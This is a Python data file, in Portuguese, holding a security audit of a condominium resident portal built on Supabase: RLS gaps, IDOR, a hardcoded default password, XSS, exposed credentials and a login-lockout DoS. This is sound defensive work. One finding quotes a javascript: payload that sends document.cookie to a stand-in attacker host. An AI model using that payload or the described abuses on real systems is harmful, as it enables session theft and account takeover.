# -*- coding: utf-8 -*-
"""
Dados brutos da auditoria de segurança — separado do script de geração do
PDF pra poder ser revisado/editado independente da lógica de layout.

Cada achado (`FINDINGS`) e cada ponto forte (`STRENGTHS`) foi verificado
lendo o código real do repositório em
C:\\Users\\joaov\\condominio-residencial-miguel-arcanjo (sessão de auditoria
de 2026-08-30). Onde não foi possível verificar algo diretamente (ex.:
conteúdo real de RLS policies em produção, que não estão versionadas), isso
está dito explicitamente no texto do achado — nada foi inventado.
"""

SEVERITY_COLORS = {
    "critica": "#B91C1C",
    "alta": "#EA580C",
    "media": "#D97706",
    "baixa": "#2563EB",
    "informativa": "#6B7280",
    "ponto_forte": "#059669",
}

SEVERITY_LABELS = {
    "critica": "Crítica",
    "alta": "Alta",
    "media": "Média",
    "baixa": "Baixa",
    "informativa": "Informativa",
}

PROJECT_NAME = "Portal Condomínio Residencial Miguel Arcanjo"

STACK_NOTE = (
    "Frontend: TanStack Start + React 19 + TypeScript, roteamento file-based "
    "(src/routes), Tailwind + shadcn/ui. Não há framework de API própria: o "
    "\u201cbackend\u201d é quase inteiramente Supabase acessado direto do "
    "browser via supabase-js (Postgres + Auth + Storage), com apenas 2 Edge "
    "Functions Deno privilegiadas (criar-morador, controle-login). Não há "
    "ORM tradicional (query builder do PostgREST via supabase-js). Auth: "
    "Supabase Auth (e-mail+senha), tabela profiles com role "
    "(sindica/morador/admin_agencia) e condominio_id, mais um mecanismo "
    "próprio de rate-limit de login (tabela login_attempts + Edge Function). "
    "Deploy: build via Vite + Nitro (preset cloudflare-module, gera "
    "wrangler.json), publicado pela plataforma Lovable — não há Dockerfile, "
    "docker-compose, GitHub Actions/CI, Helm chart ou Terraform neste "
    "repositório."
)

CATEGORY_MAPPING_NOTE = (
    "1) BANCO SEM TRANCA → mapeado para RLS (Row Level Security) do "
    "Postgres/Supabase, já que não existe camada de API própria nem "
    "middleware de tenant — é o único mecanismo de isolamento do projeto. "
    "2) PERMISSÃO NO NAVEGADOR → mapeado para: o frontend decide qual "
    "dashboard renderizar por role (síndica/morador/admin_agencia), mas as "
    "funções de escrita privilegiada em src/lib/portal-data.ts são funções "
    "JavaScript comuns, sem checagem de papel embutida — dependem 100% da "
    "RLS. 3) IDOR → mapeado para toda chamada .update()/.delete() do "
    "supabase-js que recebe um id e verificado se soma outro filtro de posse "
    "(condominio_id/morador_id) além do id. 4) CHAVES EXPOSTAS → aplicado "
    "literalmente (grep de padrões de segredo + histórico git completo) mais "
    "credenciais padrão hardcoded. 5) XSS → aplicado a "
    "dangerouslySetInnerHTML, hrefs/srcs derivados de dado gravado pelo "
    "usuário, e renderização de texto do usuário (checado se passa por "
    "innerHTML em algum ponto — não passa, é tudo JSX)."
)

# ---------------------------------------------------------------------------
# Achados
# ---------------------------------------------------------------------------
FINDINGS = [
    {
        "id": "F1",
        "category": "1. Banco sem tranca (RLS)",
        "severity": "critica",
        "file": "supabase/migrations/*  (ausência)",
        "line": "—",
        "title": "RLS e a função current_profile() da qual toda política depende não estão versionadas em nenhum lugar do repositório",
        "description": (
            "Busca por `CREATE POLICY` / `ENABLE ROW LEVEL SECURITY` em todo o "
            "repositório (supabase/migrations/ e todo o resto) encontra "
            "exatamente 2 ocorrências — pessoas_frequentes e "
            "pagamentos_importados, ambas de 2026-07/08. Nenhuma outra tabela "
            "do app (profiles, pautas, votos, reservas, "
            "historico_financeiro, obras, obra_atualizacoes, documentos, "
            "avisos_publicos, condominio_config, amenidades, chamados, "
            "visitantes, classificados, classificados_fotos, "
            "contatos_publicos, login_attempts) tem sua RLS rastreada em "
            "migration. A função `current_profile()`, citada nos comentários "
            "das duas migrations existentes como \"o mesmo padrão de RLS "
            "usado em todo o resto do schema\" e da qual toda política "
            "depende para saber o condominio_id/role do usuário logado, "
            "também não está definida em nenhum arquivo do repo — só existe "
            "ao vivo no Postgres de produção."
        ),
        "why": (
            "Não é possível revisar, testar ou auditar por code review a "
            "regra que decide se um morador consegue ler/alterar o dado de "
            "outro morador — a regra existe, mas só dentro do banco de "
            "produção, fora do git, sem PR, sem diff, sem CI. Documentação "
            "interna do próprio projeto "
            "(docs/aprendizados/2026-07-18-harness-setup-e-supabase-qa.md, "
            "linhas 29-42) já registra que a RLS da tabela `profiles` — a "
            "que decide role e condominio_id de cada usuário, ou seja, a "
            "mais sensível a escalação de privilégio de todo o sistema — foi "
            "reescrita fora do fluxo de migration em algum momento, sem "
            "revisão associada. Esta auditoria não teve acesso a "
            "credenciais de superusuário/service_role do projeto de "
            "produção (kccgazitxagxcbsuuiwn) para ler pg_policies "
            "diretamente e confirmar o conteúdo atual — o achado crítico é "
            "exatamente essa lacuna de governança: o mecanismo central de "
            "isolamento é uma caixa-preta não revisável."
        ),
        "exploit_conditions": (
            "Não depende de nenhuma condição externa — é uma lacuna de "
            "processo permanente até ser corrigida. O risco concreto que "
            "ela habilita é justamente não conseguir confirmar (nem negar) "
            "se as políticas atuais em produção estão corretas."
        ),
    },
    {
        "id": "F2",
        "category": "1. Banco sem tranca (RLS) / 3. IDOR",
        "severity": "alta",
        "file": "src/lib/portal-data.ts:247, :384, :397; src/lib/visitantes-data.ts:173, :183; src/lib/classificados-data.ts:99, :113, :123",
        "line": "múltiplas",
        "title": "Nenhuma chamada de update/delete do app soma um filtro de posse (condominio_id/morador_id) além do id — toda a proteção contra IDOR está 100% delegada à RLS não verificável",
        "description": (
            "Mapeamento sistemático de todo `.from(\"<tabela>\").update(...)`"
            " / `.delete()` do repositório (33 ocorrências em 7 arquivos) "
            "mostra que a esmagadora maioria filtra só por `.eq(\"id\", id)`"
            ", sem nenhum `.eq(\"condominio_id\", ...)` ou "
            "`.eq(\"morador_id\"/\"auth_user_id\", ...)` adicional. "
            "Exemplos: `removerReserva(id)` "
            "(portal-data.ts:246-248), `atualizarObra(id, patch)` "
            "(portal-data.ts:396-398), `removerAtualizacaoObra(id)` "
            "(portal-data.ts:383-385), `removerVisitante(id)` "
            "(visitantes-data.ts:172-174), `atualizarStatusVisitante(id, "
            "...)` (visitantes-data.ts:181-186), `atualizarClassificado(id, "
            "patch)` (classificados-data.ts:97-102), "
            "`removerClassificado(id)` (classificados-data.ts:112-114), "
            "`moderarClassificado(id, status, ...)` "
            "(classificados-data.ts:121-126). A única exceção encontrada com "
            "defesa em profundidade real é "
            "`chamados-resident-section.tsx:123-127`, que soma "
            "`.eq(\"morador_id\", profile.id)` ao fechar um chamado."
        ),
        "why": (
            "Se a política de RLS de qualquer uma dessas tabelas tiver uma "
            "falha (permitir demais, faltar uma cláusula WHERE, ou ser "
            "simplesmente `USING (true)` por engano — o tipo de erro comum "
            "quando a política é escrita à mão no SQL Editor sem revisão, "
            "como o achado F1 mostra que já aconteceu com `profiles`), o "
            "app não tem nenhuma segunda camada de proteção: qualquer "
            "morador autenticado que descobrir/adivinhar o UUID de uma "
            "reserva, chamado, visitante ou classificado de outro morador "
            "consegue alterá-lo ou apagá-lo diretamente via API do "
            "Supabase (a mesma chamada que o app faz, com a própria sessão "
            "do atacante). O caso mais concreto: a documentação interna do "
            "projeto (mesmo arquivo citado no achado F1, linha 31) lista a "
            "RLS de `reservas` como tendo sido alterada \"parcialmente\" "
            "fora do fluxo de migration — exatamente a tabela cujo "
            "`removerReserva()` não tem filtro de posse no código."
        ),
        "exploit_conditions": (
            "Depende de a RLS viva em produção não cobrir corretamente cada "
            "caso (não verificável nesta auditoria — ver F1). Não depende "
            "de nenhuma feature flag ou configuração adicional: o código "
            "cliente já está pronto pra chamar essas operações sem "
            "restrição própria."
        ),
    },
    {
        "id": "F3",
        "category": "2. Permissão definida no navegador",
        "severity": "alta",
        "file": "src/routes/index.tsx:533-540; src/lib/portal-data.ts (várias exportações)",
        "line": "533",
        "title": "O único \"gate\" de papel do app é decidir qual dashboard renderizar — as funções de escrita privilegiada não fazem nenhuma checagem de role no código",
        "description": (
            "`src/routes/index.tsx:533-540` decide qual componente "
            "renderizar (`AdminDashboard`, `AgencyAdminView` ou "
            "`ResidentDashboard`) com base em `profile.role`. Esse é "
            "essencialmente o único gate de papel explícito do frontend — "
            "uma busca por `role ===`/`isAdmin`/`canEdit` no restante do "
            "código encontra apenas 4 ocorrências em todo o `src/`. Todas "
            "as funções que `AdminDashboard` chama para escrever dados "
            "(`encerrarPauta`, `excluirPauta`, `criarPauta`, "
            "`removerMorador`, `atualizarMorador`, `criarObra`, "
            "`atualizarObra`, `criarAviso`, `atualizarAviso`, "
            "`removerAviso`, `criarAmenidade`, etc., todas em "
            "src/lib/portal-data.ts) são funções JavaScript comuns "
            "exportadas — nenhuma delas verifica internamente "
            "`profile.role` antes de montar a query. A única exceção "
            "encontrada é a Edge Function `criar-morador` "
            "(supabase/functions/criar-morador/index.ts:63-70), que valida "
            "role e condominio_id do chamador antes de usar a service_role "
            "key — um exemplo correto do padrão que falta no resto."
        ),
        "why": (
            "Nesta arquitetura (SPA batendo direto no Supabase com a "
            "chave anon/publishable, sem camada de API própria), esconder "
            "um botão \"Excluir votação\" ou \"Cadastrar obra\" na UI não "
            "impede um morador autenticado de reproduzir manualmente a "
            "mesma chamada REST/supabase-js com sua própria sessão — a "
            "aplicação inteira já está no bundle JS entregue a todo "
            "usuário, independente do papel. A única coisa que pode "
            "impedir isso de fato é a RLS, cuja governança já foi apontada "
            "como não verificável no achado F1."
        ),
        "exploit_conditions": (
            "Requer que a RLS da tabela em questão não replique "
            "corretamente a mesma checagem de papel que a UI faz (ex.: "
            "\"só sindica/admin_agencia pode fazer X\") — não verificável "
            "nesta auditoria (ver F1)."
        ),
    },
    {
        "id": "F4",
        "category": "4. Chaves expostas (credencial padrão)",
        "severity": "alta",
        "file": "supabase/functions/criar-morador/index.ts",
        "line": 82,
        "title": "Toda conta de morador nova é criada com a mesma senha fixa (\"Mudar@123\"), sem nenhum controle server-side que force a troca antes de liberar acesso",
        "description": (
            "`admin.auth.admin.createUser({ email, password: \"Mudar@123\", "
            "email_confirm: true })` — a mesma senha literal, hardcoded, é "
            "usada para toda conta de morador criada pela síndica. O "
            "profile é marcado com `primeiro_acesso: true` "
            "(patch em criar-morador/index.ts:101-107), e o frontend "
            "(`src/routes/index.tsx:519,533,546`) mostra um "
            "`FirstAccessDialog` que só deixa de aparecer depois de "
            "`supabase.auth.updateUser({ password })` — mas essa é uma "
            "checagem só no React: nada no lado do servidor impede login e "
            "uso normal da API do Supabase com a senha \"Mudar@123\" "
            "enquanto o morador real não troca."
        ),
        "why": (
            "Qualquer pessoa que descubra (ou simplesmente saiba, já que é "
            "sempre a mesma) o e-mail de um morador cadastrado — algo "
            "plausível num condomínio, por grupo de WhatsApp, contato "
            "público da landing, ou pelo próprio formulário de \"Cadastrar "
            "morador\" que mostra e-mails — pode logar como esse morador "
            "com \"Mudar@123\" antes que ele acesse pela primeira vez, ler "
            "seu financeiro/reservas/visitantes, e até trocar a senha para "
            "travar o dono legítimo fora da própria conta (account "
            "takeover). O diálogo de primeiro acesso é só uma camada de UX: "
            "não bloqueia chamadas diretas à API do Supabase."
        ),
        "exploit_conditions": (
            "Janela de tempo entre a criação da conta pela síndica e o "
            "primeiro login real do morador. Requer conhecer o e-mail "
            "cadastrado (não requer adivinhar senha, já que ela é fixa e "
            "documentada no próprio código-fonte do projeto)."
        ),
    },
    {
        "id": "F5",
        "category": "5. Inputs sem tratamento (XSS)",
        "severity": "alta",
        "file": "src/components/classificados-shell.tsx:56-58; src/lib/classificados-data.ts:53-61",
        "line": 58,
        "title": "URL de foto de classificado é usada como href sem validar o esquema — permite XSS via javascript: se inserida fora do fluxo normal de upload",
        "description": (
            "`PhotoGallery` renderiza `<a href={f.foto_url} target=\"_blank\" "
            "rel=\"noreferrer\">` (classificados-shell.tsx:56-61) para cada "
            "foto de um classificado. No fluxo normal, `foto_url` vem de "
            "`uploadClassificadoFoto` → `supabase.storage...getPublicUrl()` "
            "(classificados-data.ts:42-51), sempre uma URL https legítima. "
            "Mas a função que grava o registro, `inserirFoto` "
            "(classificados-data.ts:53-61), aceita `foto_url: string` sem "
            "nenhuma validação de formato/esquema, e é exportada — "
            "qualquer morador autenticado (dono do próprio classificado, "
            "que é quem tem permissão de inserir fotos nele) pode chamar a "
            "mesma operação de insert diretamente via API do Supabase com "
            "sua própria sessão, substituindo `foto_url` por "
            "`javascript:fetch('https://atacante/x?c='+document.cookie)` "
            "ou similar. Esse componente é usado tanto na visão do próprio "
            "morador quanto — o que eleva o impacto — na fila de aprovação "
            "da síndica (`admin.classificados.pendentes.tsx:138`), que "
            "revisa TODO classificado pendente antes de aprovar."
        ),
        "why": (
            "Um `<a href=\"javascript:...\">` executa o script no clique, "
            "no contexto de origem da própria página — diferente de "
            "`<img src=\"javascript:...\">`, que os navegadores atuais já "
            "bloqueiam. Como a fila de moderação da síndica é exatamente o "
            "fluxo desenhado para ela revisar conteúdo enviado por "
            "moradores antes de aprovar, é o cenário mais provável de "
            "clique — e a síndica é o papel de maior privilégio do "
            "sistema, tornando esse XSS um vetor de escalação de "
            "privilégio na prática (roubo de sessão da síndica)."
        ),
        "exploit_conditions": (
            "Requer que o atacante chame a API do Supabase diretamente "
            "(bypass do formulário normal, trivial via devtools/fetch com "
            "a própria sessão já autenticada) em vez de usar o fluxo de "
            "upload da UI. Requer que a RLS de `classificados_fotos` "
            "permita ao dono do classificado inserir uma foto associada a "
            "ele (comportamento esperado e correto do ponto de vista de "
            "posse — o problema é a ausência de validação de formato, não "
            "de posse)."
        ),
    },
    {
        "id": "F6",
        "category": "4. Chaves expostas (credencial em texto claro)",
        "severity": "media",
        "file": "docs/prd/*/test-plan.md (9 arquivos, ex.: docs/prd/excluir-finalizar-historico-votacao/test-plan.md)",
        "line": "18, 25, 73, 245 (exemplo)",
        "title": "Credenciais reais (e-mail pessoal + senha) da conta de síndica usada nos testes de QA estão em texto claro, versionadas, em pelo menos 9 arquivos de documentação",
        "description": (
            "Um e-mail real e uma senha real, em texto claro (ambos "
            "redigidos neste relatório — ver os arquivos citados para o "
            "valor exato), aparecem em pelo menos 9 arquivos "
            "`docs/prd/*/test-plan.md` (gerados por agentes de QA "
            "anteriores como evidência de login). O e-mail é o e-mail "
            "pessoal real do dono do projeto. A senha documentada é, pelo "
            "contexto dos próprios arquivos, usada para logar no projeto "
            "Supabase de QA dedicado (fqgmmmxxqzopcwbsdqgk) — um projeto "
            "free-tier só com schema clonado, sem dados reais de "
            "produção, conforme docs/projeto/ambiente.md."
        ),
        "why": (
            "O impacto direto é limitado (só o projeto de QA, sem dados "
            "reais), mas: (1) é uma credencial real e funcional, "
            "commitada permanentemente no histórico do git; (2) se a mesma "
            "senha tiver sido reaproveitada na conta de síndica de "
            "produção (kccgazitxagxcbsuuiwn) — o que esta auditoria NÃO "
            "verificou e não pode confirmar nem negar —, o vazamento "
            "afeta produção de verdade; (3) o e-mail real do responsável "
            "pelo projeto fica associado publicamente a um padrão de "
            "senha, o que ajuda ataques de engenharia social/password "
            "spraying contra outras contas da mesma pessoa."
        ),
        "exploit_conditions": (
            "Requer acesso de leitura ao repositório git (privado hoje, "
            "mas qualquer colaborador, CI de terceiros, ou vazamento "
            "futuro do repo expõe isso). Impacto em produção é "
            "condicional a reuso de senha entre QA e produção "
            "(não verificado)."
        ),
    },
    {
        "id": "F7",
        "category": "4. Chaves expostas (.env versionado)",
        "severity": "baixa",
        "file": ".env",
        "line": "1-2 (commit 0463c0d)",
        "title": "O arquivo .env está rastreado no git apesar de listado no .gitignore — hoje só expõe a chave publicável, mas quebra a rede de proteção contra um segredo real ser commitado no futuro",
        "description": (
            "`.gitignore` lista `.env`, `.env.local` e `.env.qa` "
            "explicitamente, mas `git ls-files` mostra `.env` como "
            "rastreado, adicionado no commit `0463c0d`. O conteúdo atual "
            "(`git show HEAD:.env`) é só "
            "`VITE_SUPABASE_URL`/`VITE_SUPABASE_ANON_KEY` — uma chave "
            "`sb_publishable_...`, que pelo próprio design do Supabase é "
            "segura para ir no bundle do cliente (equivalente a uma chave "
            "pública, já visível a qualquer usuário via devtools "
            "independente do git). Busca completa no histórico do git "
            "(`git log --all -p`) não encontrou nenhuma "
            "`SERVICE_ROLE_KEY`, chave privada ou outro segredo real em "
            "nenhum commit — só essa chave pública."
        ),
        "why": (
            "Não é um vazamento de segredo real hoje, mas é uma falha de "
            "processo: o `.gitignore` foi escrito assumindo que `.env` "
            "nunca seria commitado, e já foi mesmo assim (provavelmente "
            "por um `git add -f` ou por ter sido commitado antes da regra "
            "existir). Isso significa que a rede de segurança que "
            "impediria alguém de commitar sem querer uma "
            "`SUPABASE_SERVICE_ROLE_KEY` real nesse mesmo arquivo `.env` "
            "no futuro já está furada — `git add -u`/`git commit -a` vai "
            "continuar versionando esse arquivo normalmente."
        ),
        "exploit_conditions": (
            "Nenhuma no estado atual (a chave já é pública por design). "
            "Vira um risco real apenas se uma variável sensível for "
            "adicionada ao mesmo `.env` no futuro."
        ),
    },
    {
        "id": "F8",
        "category": "Achado adicional (fora das 5 categorias solicitadas) — autorização/DoS",
        "severity": "baixa",
        "file": "supabase/functions/controle-login/index.ts",
        "line": "34-69",
        "title": "Qualquer chamador não autenticado pode registrar tentativas de login falhas para um e-mail arbitrário e bloquear a conta de outra pessoa por 15 minutos, repetidamente",
        "description": (
            "A Edge Function `controle-login` aceita `{action: "
            "\"registrar\", email, sucesso: false}` de qualquer chamador "
            "que tenha a chave anon/publishable (pública, embutida no "
            "bundle do cliente) — não exige uma sessão de usuário "
            "autenticado, nem vincula a chamada a uma tentativa real de "
            "`signInWithPassword`. `verify_jwt = true` no "
            "`supabase/config.toml` só exige um JWT válido do Supabase "
            "(inclusive o JWT anônimo público), não uma sessão de usuário "
            "real."
        ),
        "why": (
            "Um atacante pode chamar essa função repetidamente com o "
            "e-mail de qualquer morador/síndica e `sucesso: false`, "
            "atingindo o limite de 5 falhas "
            "(`controle-login/index.ts:12`) e mantendo a conta bloqueada "
            "indefinidamente (repetindo a cada 15 minutos) — uma negação "
            "de serviço direcionada, sem precisar adivinhar senha nenhuma. "
            "O design de não confirmar/negar existência de e-mail (bom, "
            "evita enumeração — ver Pontos Fortes) acaba não importando "
            "aqui, porque o abuso não depende de saber se o e-mail existe."
        ),
        "exploit_conditions": (
            "Requer só conhecer/adivinhar o e-mail alvo — nenhuma "
            "autenticação, chave especial ou configuração adicional."
        ),
    },
    {
        "id": "F9",
        "category": "5. Inputs sem tratamento (XSS) — informativo",
        "severity": "informativa",
        "file": "src/components/ui/chart.tsx",
        "line": 73,
        "title": "dangerouslySetInnerHTML existe no boilerplate padrão do shadcn/ui (chart.tsx), mas o componente não é usado em nenhum lugar do app hoje",
        "description": (
            "`ChartStyle` monta um `<style dangerouslySetInnerHTML>` a "
            "partir de `config.color`/`config.theme` (chart.tsx:71-89). "
            "Busca por `ChartContainer`/`ChartConfig`/import de "
            "`components/ui/chart` em todo o `src/` não encontra nenhum "
            "uso — é código gerado pelo instalador de componentes do "
            "shadcn/ui que nunca chegou a ser adotado (o app usa "
            "`recharts` diretamente, sem esse wrapper)."
        ),
        "why": (
            "Sem uso, não há caminho de dado do usuário até esse "
            "`dangerouslySetInnerHTML` hoje — risco teórico, não "
            "explorável no estado atual do código. Documentado para "
            "constar como cobertura completa da varredura, e como alerta "
            "para o dia em que alguém decidir usar `ChartContainer`: os "
            "valores de `color` precisariam vir só de config estática do "
            "desenvolvedor, nunca de input de usuário."
        ),
        "exploit_conditions": "Não aplicável hoje — código morto, sem import em nenhuma rota/componente ativo.",
    },
]

# ---------------------------------------------------------------------------
# Pontos fortes (verificados como corretos)
# ---------------------------------------------------------------------------
STRENGTHS = [
    {
        "title": "Edge Function criar-morador valida role e condominio_id do chamador antes de usar a service_role key",
        "evidence": "supabase/functions/criar-morador/index.ts:57-70 — exige role em ['sindica','admin_agencia'] e condominio_id igual ao do payload antes de qualquer operação privilegiada.",
    },
    {
        "title": "controle-login isola a service_role no servidor e nunca confirma/nega existência de e-mail",
        "evidence": "supabase/functions/controle-login/index.ts — resposta idêntica para e-mail real ou inventado, evitando enumeração de contas (o achado F8 é um problema à parte, de autorização, não de vazamento de dado).",
    },
    {
        "title": "whatsappLink() sanitiza a entrada removendo tudo que não é dígito antes de montar a URL",
        "evidence": "src/lib/classificados-data.ts:261-270 — whatsappToNumber() usa replace(/\\D/g, \"\"), tornando impossível injetar um esquema como javascript: nesse campo específico.",
    },
    {
        "title": "Nenhum conteúdo gerado por usuário (títulos, descrições, mensagens) é renderizado via innerHTML/HTML bruto em lugar nenhum do app verificado",
        "evidence": "Todo texto de classificados, chamados, avisos, mensagens externas e pautas é renderizado via interpolação JSX simples ({variavel}), que o React escapa automaticamente — busca por dangerouslySetInnerHTML/innerHTML no repo só retorna o caso isolado e não-usado do achado F9.",
    },
    {
        "title": "As duas tabelas com RLS versionada (pessoas_frequentes, pagamentos_importados) têm políticas corretamente escopadas por dono/role",
        "evidence": "supabase/migrations/20260727130000_pessoas_frequentes.sql:16-31 escopa tudo por morador_id = current_profile(); supabase/migrations/20260818220000_fundo_obras_importacao.sql:35-47 escopa por condominio_id + role.",
    },
    {
        "title": "A função SECURITY DEFINER fundo_obras_total() revalida o condominio_id do chamador mesmo recebendo o parâmetro do cliente",
        "evidence": "supabase/migrations/20260818220000_fundo_obras_importacao.sql:55-66 — o WHERE final sempre soma \"and condominio_id = (select condominio_id from current_profile())\", então não pode ser usada para ler o total de outro condomínio mesmo passando outro id.",
    },
    {
        "title": "Nenhum segredo real (service_role key, chave privada, token) foi encontrado em todo o histórico do git",
        "evidence": "git log --all -p em todo o repositório, buscando padrões de SERVICE_ROLE_KEY, chaves sb_secret_, blocos PRIVATE KEY e chaves AWS — zero ocorrências em 197 commits.",
    },
    {
        "title": ".env.qa nunca foi commitado, ao contrário do .env de produção",
        "evidence": "git ls-files não lista .env.qa — a única credencial de fato sensível a esse arquivo (anon key do projeto de QA) nunca entrou no repositório.",
    },
    {
        "title": "src/lib/supabase.ts não usa um valor default inseguro quando a URL/chave não está configurada",
        "evidence": "src/lib/supabase.ts:6-11 — apenas emite um console.warn; não tenta continuar com uma URL/chave placeholder que pudesse mascarar erro de configuração.",
    },
    {
        "title": "Fechamento de chamado pelo próprio morador soma filtro de posse, além do id (defesa em profundidade correta)",
        "evidence": "src/components/chamados-resident-section.tsx:123-127 — .eq(\"id\", id).eq(\"morador_id\", profile.id), o único write do app com esse padrão.",
    },
    {
        "title": "Ambas as Edge Functions declaram verify_jwt = true",
        "evidence": "supabase/config.toml:3-6 — reduz superfície de chamadas totalmente anônimas (embora, no caso de controle-login, isso não seja suficiente sozinho — ver achado F8).",
    },
    {
        "title": "Categoria \"Docker/CI/Helm/Terraform\" não se aplica a este projeto",
        "evidence": "Nenhum Dockerfile, docker-compose.yml, arquivo .tf, chart Helm ou workflow em .github/ existe no repositório — deploy é feito pela plataforma Lovable a partir do build Vite/Nitro.",
    },
]

# ---------------------------------------------------------------------------
# Recomendações priorizadas
# ---------------------------------------------------------------------------
RECOMMENDATIONS = {
    "P1 — Imediato": [
        "Extrair TODAS as RLS policies e a função current_profile() do banco de produção (via supabase db pull, ou SQL Editor + pg_policies) e trazer para supabase/migrations/, sob revisão de código dali em diante (resolve F1).",
        "Com a RLS extraída, confirmar item a item que profiles/pautas/votos/reservas/historico_financeiro/obras/obra_atualizacoes checam condominio_id e, quando aplicável, posse individual (morador_id/auth_user_id) — dar atenção especial a `profiles` e `reservas`, já documentadas como alteradas fora do fluxo de migration (resolve F1, F2).",
        "Trocar a senha fixa \"Mudar@123\" (criar-morador/index.ts:82) por uma senha aleatória por conta, ou migrar para convite via magic link/OTP nativo do Supabase Auth (resolve F4).",
        "Remover .env do índice do git (git rm --cached .env) e commitar um .env.example sem valores reais; adicionar um hook de pre-commit ou step de CI que rejeite qualquer .env* sendo commitado (resolve F7).",
        "Trocar a senha da conta de síndica no Supabase de QA e, dali em diante, referenciar credenciais de teste nos docs por um cofre de senhas (1Password/Bitwarden) em vez de texto claro (resolve F6).",
    ],
    "P2 — Curto prazo": [
        "Adicionar filtro de posse (condominio_id e/ou morador_id) em toda chamada update()/delete() do código como defesa em profundidade, mesmo com a RLS corrigida — não depender de uma única camada (resolve F2, F3).",
        "Validar o esquema de qualquer URL gravada pelo usuário (foto_url, url de documento) antes de inserir — aceitar só http:/https:, e/ou sanitizar no componente de renderização checando new URL(x).protocol antes de usar em href/src (resolve F5).",
        "Consolidar as duas gerações de RLS de `classificados` (remover as políticas antigas baseadas em profiles.id = auth.uid(), mantendo só as baseadas em current_profile()) — já documentado como dívida técnica conhecida.",
        "Adicionar alguma amarração de sessão/CAPTCHA ao endpoint \"registrar\" de controle-login, ou pelo menos rate-limit por IP chamador além de por e-mail alvo (resolve F8).",
    ],
    "P3 — Melhoria contínua": [
        "Criar um teste de regressão (script Node/Deno rodando contra o Supabase de QA) que loga como morador A e confirma que não consegue ler/escrever registros do morador B — pega regressão de RLS automaticamente.",
        "Adicionar gitleaks (ou equivalente) como hook de pre-commit para flagar segredos e padrões de credencial antes do commit chegar ao histórico.",
        "Resolver a divergência CRLF/LF (já documentada em docs/projeto/ambiente.md como dívida separada) para poder usar lint como gate real de qualidade — hoje mascara os poucos problemas reais.",
    ],
}
